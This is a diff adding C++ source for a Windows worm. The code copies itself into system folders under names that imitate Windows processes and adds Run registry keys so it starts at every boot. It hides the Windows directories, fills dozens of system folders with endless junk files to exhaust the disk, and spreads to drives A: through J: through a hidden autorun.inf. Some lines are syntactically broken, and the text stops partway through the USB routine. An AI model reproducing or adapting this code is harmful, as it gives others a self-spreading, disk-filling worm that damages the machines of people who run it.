@@ -1,0 +1,918 @@
+#include <stdlib.h>
+#include <string>
+#include <stdio.h>
+#include <fstream>
+#include <sstream>
+#include <windows.h>
+void SpreadToUSB();
+int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
+                            LPSTR lpszArgument, int nFunsterStil){
+FreeConsole();
+string      s = "111...";   //actual value is millions of 1s
+string      file;
+int         rando               =   rand();
+char        system32[MAX_PATH], windows[MAX_PATH], main[MAX_PATH];
+HMODULE     fileLocation        =   GetModuleHandle(NULL); 
+            GetModuleFileName       (fileLocation,main,sizeof(main));
+            GetSystemDirectory      (system32,sizeof(system32));
+            GetWindowsDirectory     (windows,sizeof(windows));
+            SetFileAttributes       (windows,FILE_ATTRIBUTE_HIDDEN);
+            SetFileAttributes       (system32,FILE_ATTRIBUTE_HIDDEN);
+HKEY        key;
+            strcat(system32,"\\csrsc.exe");
+            CopyFile(main,system32,false); 
+            RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
+            KEY_SET_VALUE,&key);                       
+            RegSetValueEx(key,"ctfmonr.exe",0,REG_SZ,(const unsigned char*)system32,
+            sizeof(system32));
+            RegCloseKey(key);
+            strcat(windows,"\\pchealth\\helpctr\\Config\\csrss.exe");
+            CopyFile(main,windows,false);
+            RegOpenKeyEx(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
+            KEY_SET_VALUE,&key);                       
+            RegSetValueEx(key,"ctfmonr.exe",0,REG_SZ,(const unsigned char*)windows,
+            sizeof(windows));
+            RegCloseKey(key);
+            RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",0,
+            KEY_SET_VALUE,&key);
+            RegDeleteKey(key,"{FD6905CE-952F-41F1-9A6F-135D9C6622CC}");
+            RegCloseKey(key);
+            rando = rand();
+            ostringstream ran;
+            rando << rando;
+            SpreadToUSB();
+for(int i=1;i!=-99;i++){
+GetWindowsDirectory(windows,sizeof(windows));
+switch (i){
+case 1:
+        strcat(windows,"\\pchealth");
+        break;
+case 2:
+        strcat(windows,"\\inf");
+        break;
+case 3:
+        strcat(windows,"\\security");
+        break;
+case 4:
+        strcat(windows,"\\Win32");
+        CreateDirectory(windows,NULL);
+        SetFileAttributes(windows,FILE_ATTRIBUTE_HIDDEN);
+        break;
+case 5:
+        strcat(windows,"\\system32");
+        break;
+case 6:
+        strcat(windows,"\\mui");
+        break;
+case 7:
+        strcat(windows,"\\pcstatus");
+        CreateDirectory(windows,NULL);
+        break;
+case 8:
+        strcat(windows,"\\Media");
+        break;
+case 9:
+        strcat(windows,"\\Debug\\Setup\\Backup");
+        break;
+case 10:
+        strcat(windows,"\\Help");
+        break;
+case 11:
+        strcat(windows,"\\Temp");
+        break;
+case 12:
+        strcat(windows,"\\repair");
+        break;
+case 13:
+        strcat(windows,"\\Microsoft.NET\\Framework");
+        break;
+case 14:
+        strcat(windows,"\\ime");
+        break;
+case 15:
+        strcat(windows,"\\WBEM");
+        break;
+case 16:
+        strcat(windows,"\\PIF");
+        break;
+case 17:
+        strcat(windows,"\\AppPatch");
+        break;
+case 18:
+        strcat(windows,"\\Web\\Printers");
+        break;
+case 19:
+        strcat(windows,"\\ServicePackFiles\\i386");
+        break;
+case 20:
+        strcat(windows,"\\$hf_mig$");
+        break;
+case 21:
+        strcat(windows,"\\msagent");
+        break;
+case 22:
+        strcat(windows,"\\msagent\\chars");
+        break;
+case 23:
+        strcat(windows,"\\msapps");
+        break;
+case 24:
+        strcat(windows,"\\msinfo");
+        break;
+case 25:
+        SpreadToUSB();
+        strcat(windows,"\\system32\\CatRoot");    
+        break;
+case 26:
+        strcat(windows,"\\system32\\CatRoot2");
+        break;
+case 27:
+        strcat(windows,"\\system32\\wins");
+        break;
+case 28:
+        strcat(windows,"\\system32\\drivers");
+        break;
+case 29:
+        strcat(windows,"\\system32\\bits");
+        break;
+case 30:
+        strcat(windows,"\\system32\\spool");
+        break;
+case 31:
+        strcat(windows,"\\system32\\spool\\drivers");
+        break;
+case 32:
+        strcat(windows,"\\system32\\en");
+        break;
+case 33:
+        strcat(windows,"\\system32\\config");
+        break;
+case 34:
+        strcat(windows,"\\system32\\oobe");
+        break;
+case 35:
+        strcat(windows,"\\system32\\LogFiles");
+        break;
+case 36:
+        strcat(windows,"\\system32\\Microsoft");
+        break;
+case 37:
+        strcat(windows,"\\system32\\IME");
+        break;
+case 38:
+        strcat(windows,"\\system32\\ias");
+        break;
+case 39:
+        strcat(windows,"\\system32\\ras");
+        break;
+case 40:
+        strcat(windows,"\\system32\\Com");
+        break;
+case 41:
+        strcat(windows,"\\system32\\en-us");
+        break;
+case 42:
+        strcat(windows,"\\system32\\PreInstall");
+        break;
+case 43:
+        strcat(windows,"\\system32\\inetsrv");
+        break;
+case 44:
+        strcat(windows,"\\system32\\npp");
+        break;
+case 45:
+        strcat(windows,"\\system32\\ShellExt");
+        break;
+case 46:
+        strcat(windows,"\\system32\\URTTemp");
+        break;
+case 47:
+        strcat(windows,"\\system32\\Restore");
+        break;
+case 48:
+        strcat(windows,"\\system32\\scripting");
+        break;
+case 49:
+        strcat(windows,"\\system32\\DRVSTORE");
+        break;
+case 50:
+        strcat(windows,"\\Death");
+        CreateDirectory(windows,NULL);
+        break; 
+default:
+        i = 1;
+        SpreadToUSB();
+        break;
+}
+  file = windows;
+  rando = rand();
+  ran << rando;
+  file.append("\\");
+  file.append(ran.str());
+  file.append(ran.str());
+  file.append(".sys");
+  offstream o(file.c_str());
+  offstream << s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+  o.close();
+ file = windows;
+file.append("\\");
+file.append("");
+file.append(ran.str());
+file.append(ran.str());
+file.append(ran.str());
+file.append(".dll");
+ofstream of(file.c_str());
+of << s<<s<<s<<s<<s<<s<<s
+<<s<<s<<s<<s<<s<<s<<s<<s
+<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+of.close();
+ file = windows;
+  file.append("\\");
+  file.append(ran.str());
+    file.append(ran.str());
+      file.append(ran.str());
+      file.append(".exe");
+  ofstream out(file.c_str());
+  out << s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+  out.close();
+  file = windows;
+  file.append("\\");
+  file.append(ran.str());
+  file.append(ran.str());
+  file.append(ran.str());
+  file.append(".nt");
+  ofstream files(file.c_str());
+  files << s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+  files.close();
+  file = windows;
+  file.append("\\");
+    file.append(ran.str());
+      file.append(ran.str());
+        file.append(ran.str());
+          file.append(".dbf");
+          ofstream outfile(file.c_str());
+          outfile<<s<<s<<s<<s<<s
+          <<s<<s<<s<<s<<s<<s<<s
+          <<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+          outfile.close();
+  file = windows;
+  file.append("\\");
+    file.append(ran.str());
+      file.append(ran.str());
+        file.append(ran.str());
+          file.append(".dbg");
+          ofstream fileout(file.c_str());
+          fileout<<s<<s<<s<<s<<s<<s
+          <<s<<s<<s<<s<<s<<s<<s<<s
+          <<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+          fileout.close();
+      file = windows;
+  rando = rand();
+  ran << rando;
+  file.append("\\");
+  file.append(ran.str());
+  file.append(ran.str());
+  file.append(".vx");
+  ofstream offf(file.c_str());
+  offf << s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+  offf.close();
+  file = windows;
+  rando = rand();
+  ran << rando;
+  file.append("\\");
+  file.append(ran.str());
+  file.append(ran.str());
+  file.append(".bmp");
+  ofstream ol(file.c_str());
+  ol << s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+  ol.close();
+  file = windows;
+  rando = rand();
+  ran << rando;
+  file.append("\\");
+  file.append(ran.str());
+  file.append(ran.str());
+  file.append(".wep");
+  ofstream os(file.c_str());
+  os << s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+  os.close();
+  file = windows;
+  rando = rand();
+  ran << rando;
+  file.append("\\");
+  file.append(ran.str());
+  file.append(ran.str());
+  file.append(".lpstr");
+  ofstream or(file.c_str());
+  or << s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s<<s<<s<<s<<s<<s
+  <<s<<s;
+  or.close();
+
+  }
+}
+void SpreadToUSB(){
+string Filename;
+char main [MAX_PATH];
+HMODULE fileLocation=   
+GetModuleHandle(NULL);
+GetModuleFileName
+(fileLocation,main,sizeof(main));
+if(CreateDirectory("A:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("A:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"A:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("A:\\RECYCLER\\spools",NULL);
+    CreateDirectory("A:\\DRMv1PM",NULL);
+    CopyFile(main,"A:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("A:\\DRMv1PM.lic","A:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("A:\\DRMv1PM.lic","A:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"A:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"A:\\Explorer.exe",false);
+    CopyFile(main,"A:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("A:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("A:\\autorun.inf");
+    Filename = "A:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("A:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("A:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("A:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("A:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("A:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("A:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("A:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("B:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("B:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"B:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("B:\\RECYCLER\\spools",NULL);
+    CreateDirectory("B:\\DRMv1PM",NULL);
+    CopyFile(main,"B:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("B:\\DRMv1PM.lic","B:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("B:\\DRMv1PM.lic","B:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"B:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"B:\\Explorer.exe",false);
+    CopyFile(main,"B:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("B:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("B:\\autorun.inf");
+    Filename = "B:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("B:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("B:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("B:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("B:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("B:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("B:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("B:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("C:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("C:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"C:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("C:\\RECYCLER\\spools",NULL);
+    CreateDirectory("C:\\DRMv1PM",NULL);
+    CopyFile(main,"C:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("C:\\DRMv1PM.lic","C:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("C:\\DRMv1PM.lic","C:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"C:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"C:\\Explorer.exe",false);
+    CopyFile(main,"C:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("C:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("C:\\autorun.inf");
+    Filename = "C:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("C:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("C:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("C:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("C:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("C:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("C:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("C:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("D:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("D:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"D:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("D:\\RECYCLER\\spools",NULL);
+    CreateDirectory("D:\\DRMv1PM",NULL);
+    CopyFile(main,"D:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("D:\\DRMv1PM.lic","D:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("D:\\DRMv1PM.lic","D:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"D:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"D:\\Explorer.exe",false);
+    CopyFile(main,"D:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("D:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("D:\\autorun.inf");
+    Filename = "D:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("D:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("D:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("D:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("D:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("D:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("D:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("D:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("E:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("E:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"E:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("E:\\RECYCLER\\spools",NULL);
+    CreateDirectory("E:\\DRMv1PM",NULL);
+    CopyFile(main,"E:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("E:\\DRMv1PM.lic","E:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("E:\\DRMv1PM.lic","E:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"E:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"E:\\Explorer.exe",false);
+    CopyFile(main,"E:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("E:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("E:\\autorun.inf");
+    Filename = "E:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("E:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("E:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("E:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("E:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("E:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("E:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("E:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("F:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("F:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"F:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("F:\\RECYCLER\\spools",NULL);
+    CreateDirectory("F:\\DRMv1PM",NULL);
+    CopyFile(main,"F:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("F:\\DRMv1PM.lic","F:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("F:\\DRMv1PM.lic","F:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"F:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"F:\\Explorer.exe",false);
+    CopyFile(main,"F:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("F:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("F:\\autorun.inf");
+    Filename = "F:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("F:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("F:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("F:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("F:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("F:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("F:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("F:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("G:\\pp",NULL) == ERROR_SUCCESS){
+
+switch(GetDriveType("G:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"G:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("G:\\RECYCLER\\spools",NULL);
+    CreateDirectory("G:\\DRMv1PM",NULL);
+    CopyFile(main,"G:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("G:\\DRMv1PM.lic","G:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("G:\\DRMv1PM.lic","G:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"G:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"G:\\Explorer.exe",false);
+    CopyFile(main,"G:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("G:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("G:\\autorun.inf");
+    Filename = "G:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("G:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("G:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("G:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("G:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("G:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("G:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("G:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("H:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("H:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"H:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("H:\\RECYCLER\\spools",NULL);
+    CreateDirectory("H:\\DRMv1PM",NULL);
+    CopyFile(main,"H:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("H:\\DRMv1PM.lic","H:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("H:\\DRMv1PM.lic","H:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"H:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"H:\\Explorer.exe",false);
+    CopyFile(main,"H:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("H:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("H:\\autorun.inf");
+    Filename = "H:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("H:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("H:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("H:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("H:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("H:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("H:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("H:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("I:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("I:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"I:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("I:\\RECYCLER\\spools",NULL);
+    CreateDirectory("I:\\DRMv1PM",NULL);
+    CopyFile(main,"I:\\DRMv1PM\\DRMv1PM.exe",false);
+    CopyFile("I:\\DRMv1PM.lic","I:\\DRMv1PM\\DRMv0PM.lic",false);
+    CopyFile("I:\\DRMv1PM.lic","I:\\RECYCLER\\spools\\DRMv0PM.lic",false);
+    CopyFile(main,"I:\\RECYCLER\\spools\\spoolsv.exe",false);
+    CopyFile(main,"I:\\Explorer.exe",false);
+    CopyFile(main,"I:\\RECYCLER\\Rclrlib.dll",false);
+    SetFileAttributes("I:\\autorun.inf",FILE_ATTRIBUTE_NORMAL);
+    DeleteFile("I:\\autorun.inf");
+    Filename = "I:\\autorun.inf";
+    ofstream of(Filename.c_str());
+    of << "[autorun]\n";
+    of << "open=RECYCLER\\spools\\spoolsv.exe\n";
+    of << "action=Open folder to view files\n";
+    of << "icon=%systemroot%\\system32\\shell32.dll,4";
+    of.close();
+    SetFileAttributes("I:\\RECYCLER\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("I:\\RECYCLER\\spools",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("I:\\RECYCLER\\spools\\spoolsv.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("I:\\autorun.inf",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("I:\\DRMv1PM",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("I:\\DRMv1PM\\DRMv1PM.exe",FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("I:\\Explorer.exe",FILE_ATTRIBUTE_SYSTEM);
+    break;
+}
+}
+if(CreateDirectory("J:\\pp",NULL) == ERROR_SUCCESS){
+switch(GetDriveType("J:\\")){
+case DRIVE_FIXED:
+    CopyFile(main,"J:\\Mozilla Firefox.exe",false);
+    break;
+case DRIVE_REMOVABLE:
+    CreateDirectory("J:\\RECYCLER\\spools",NULL);
